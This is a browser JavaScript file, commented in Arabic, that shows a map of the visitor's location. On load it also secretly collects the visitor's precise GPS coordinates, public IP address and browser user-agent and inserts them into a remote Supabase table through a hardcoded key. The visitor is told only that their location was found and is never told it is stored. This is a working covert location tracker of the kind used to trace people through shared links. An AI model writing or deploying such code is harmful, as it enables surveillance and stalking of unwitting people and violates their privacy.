const SUPA_URL = 'https://tboesfndjwxpxkkpdllf.supabase.co';
const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRib2VzZm5kand4cHhra3BkbGxmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY0NTkxNDgsImV4cCI6MjA3MjAzNTE0OH0.HdYXGpBy1E3HXieQIIuSXfjdV5q-u9qCe4AG7POKS9E';

const supabase = window.supabase.createClient(SUPA_URL, SUPA_KEY);

// إعداد الخريطة
const map = L.map('map').setView([24.7136, 46.6753], 13); // موقع افتراضي: الرياض

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  attribution: '&copy; OpenStreetMap contributors'
}).addTo(map);

let marker = null;

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const json = await res.json();
    return json.ip;
  } catch {
    return null;
  }
}

function getLocation(timeout = 20000) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation)
      return reject(new Error("المتصفح لا يدعم تحديد الموقع"));
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      err => reject(err),
      { enableHighAccuracy: true, timeout }
    );
  });
}

async function storeLocation(coords, ip) {
  const device = navigator.userAgent;
  const { error } = await supabase.from("locations").insert([{
    device_name: device,
    ip: ip,
    lat: coords.latitude,
    lng: coords.longitude,
    accuracy: coords.accuracy ?? null,
  }]);
  if (error) {
    console.error("❌ فشل في الحفظ:", error.message);
  } else {
    console.log("✅ تم الحفظ بنجاح في Supabase");
  }
}

(async () => {
  try {
    const coords = await getLocation();
    const ip = await getIP();

    map.setView([coords.latitude, coords.longitude], 15);
    marker = L.marker([coords.latitude, coords.longitude]).addTo(map)
      .bindPopup("📍 تم تحديد موقعك").openPopup();

    await storeLocation(coords, ip);
  } catch (e) {
    console.warn("⚠️ فشل في تحديد الموقع:", e.message);
  }
})();
